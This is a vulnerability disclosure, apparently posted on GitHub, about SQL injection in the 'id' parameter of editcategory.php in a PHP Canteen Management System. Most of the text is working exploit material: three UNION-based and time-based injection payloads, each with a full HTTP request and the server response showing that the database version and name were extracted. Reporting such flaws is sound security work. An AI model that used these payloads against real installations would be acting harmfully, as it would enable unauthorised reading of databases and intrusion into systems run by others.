# Canteen Management System  has SQL injection

BUG_Author: Pass-A
vendors:https://www.sourcecodester.com/php/15688/canteen-management-system-project-source-code-php.html

Vulnerability File: /youthappam/youthappam/editcategory.php

Parameter "id" (GET), exists delayed injection vulnerability
Payload1: id=-6706' UNION ALL SELECT NULL,CONCAT(0x7178767171,IFNULL(CAST(version() AS NCHAR),0x20),0x7170707a71),NULL,NULL-- - 

```
GET /youthappam/youthappam/editcategory.php?id=-6706%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7178767171%2CIFNULL%28CAST%28version%28%29%20AS%20NCHAR%29%2C0x20%29%2C0x7170707a71%29%2CNULL%2CNULL--%20- HTTP/1.1
Host: 192.168.31.230
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.31.230/youthappam/youthappam/categories.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=3jk5le3ldtfg5e2bn3b6i6fpg3
Connection: close
```

version()，The server response the version of database  (8.0.12)

![图片1](https://user-images.githubusercontent.com/28854626/202444469-a35c23eb-ae9d-4bb8-8c9a-32ce7fa59d80.png)


Payload2:-6706' UNION ALL SELECT NULL,CONCAT(0x7178767171,IFNULL(CAST(database() AS 
NCHAR),0x20),0x7170707a71),NULL,NULL-- -



```
GET /youthappam/youthappam/editcategory.php?id=-6706%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7178767171%2CIFNULL%28CAST%28database%28%29%20AS%20NCHAR%29%2C0x20%29%2C0x7170707a71%29%2CNULL%2CNULL--%20- HTTP/1.1
Host: 192.168.31.230
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.31.230/youthappam/youthappam/categories.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=3jk5le3ldtfg5e2bn3b6i6fpg3
Connection: close
```

Database() ,The server response the name of database   (youthappam)

![图片2](https://user-images.githubusercontent.com/28854626/202444533-60b32c53-c131-479b-b7af-e4c8f445df75.png)



Payload3:-2184' UNION ALL SELECT NULL,CONCAT(0x7178767171,IFNULL(CAST(sleep(6) AS NCHAR),0x20),0x7170707a71),NULL,NULL-- - HTTP/1.

```
GET /youthappam/youthappam/editcategory.php?id=-2184%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7178767171%2CIFNULL%28CAST%28sleep%286%29%20AS%20NCHAR%29%2C0x20%29%2C0x7170707a71%29%2CNULL%2CNULL--%20- HTTP/1.1
Host: 192.168.31.230
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.31.230/youthappam/youthappam/categories.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=3jk5le3ldtfg5e2bn3b6i6fpg3
Connection: close
```



sleep(6)，The server response time is 6 seconds

![图片3](https://user-images.githubusercontent.com/28854626/202444575-7c294b2f-36be-4b5b-9d50-ac0dc41b37e7.png)
